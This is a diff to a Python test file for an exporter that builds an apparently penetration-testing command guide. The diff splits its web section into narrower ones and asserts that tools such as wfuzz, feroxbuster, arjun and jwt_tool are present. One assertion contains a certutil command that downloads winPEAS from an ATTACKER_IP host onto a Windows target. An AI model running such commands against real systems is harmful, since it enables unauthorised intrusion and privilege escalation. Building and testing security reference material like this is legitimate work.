@@ -66,7 +66,7 @@ class ExportWebContentTests(unittest.TestCase):
 
     def test_web_section_includes_gobuster_command_alternatives(self):
         payload = export_web_content.build_payload(export_web_content.load_source_sections())
-        web_section = next(section for section in payload["sections"] if section["slug"] == "web-y-apis")
+        web_section = next(section for section in payload["sections"] if section["slug"] == "web-discovery")
 
         commands = "\n".join(web_section["commands"])
 
@@ -75,24 +75,35 @@ class ExportWebContentTests(unittest.TestCase):
 
     def test_web_section_includes_fuzzing_command_alternatives(self):
         payload = export_web_content.build_payload(export_web_content.load_source_sections())
-        web_section = next(section for section in payload["sections"] if section["slug"] == "web-y-apis")
+        web_section = next(section for section in payload["sections"] if section["slug"] == "web-discovery")
 
         commands = "\n".join(web_section["commands"])
 
         self.assertIn("wfuzz -c", commands)
-        self.assertIn("ffuf -u \"$URL/api/FUZZ\"", commands)
+        self.assertIn("arjun -u", commands)
         self.assertIn("feroxbuster -u $URL", commands)
+
+    def test_web_split_sections_stay_focused(self):
+        payload = export_web_content.build_payload(export_web_content.load_source_sections())
+        by_slug = {section["slug"]: section for section in payload["sections"]}
+
+        for slug in ["web-discovery", "web-apis-y-autorizacion", "web-inyecciones", "web-ficheros-y-ejecucion"]:
+            self.assertIn(slug, by_slug, f"missing web section: {slug}")
+
+        # No single web section should re-accumulate the old 83-command wall.
+        for slug in ["web-discovery", "web-apis-y-autorizacion", "web-inyecciones", "web-ficheros-y-ejecucion"]:
+            self.assertLess(len(by_slug[slug]["commands"]), 40, f"{slug} is too dense")
 
     def test_full_guide_commands_are_merged_into_existing_sections(self):
         payload = export_web_content.build_payload(export_web_content.load_source_sections())
 
         windows = next(section for section in payload["sections"] if section["slug"] == "windows-privesc")
         pivoting = next(section for section in payload["sections"] if section["slug"] == "pivoting")
-        web = next(section for section in payload["sections"] if section["slug"] == "web-y-apis")
+        web_apis = next(section for section in payload["sections"] if section["slug"] == "web-apis-y-autorizacion")
 
         self.assertIn("certutil -urlcache -split -f http://ATTACKER_IP:8000/winPEASx64.exe C:\\Windows\\Temp\\winpeas.exe", windows["commands"])
         self.assertIn("sudo ip tuntap add user $USER mode tun ligolo", pivoting["commands"])
-        self.assertIn("jwt_tool TOKEN", web["commands"])
+        self.assertIn("jwt_tool TOKEN", web_apis["commands"])
         self.assertGreaterEqual(payload["stats"]["totalCommands"], 200)
 
     def test_phase_is_inferred_from_primary_topic_before_broad_tags(self):
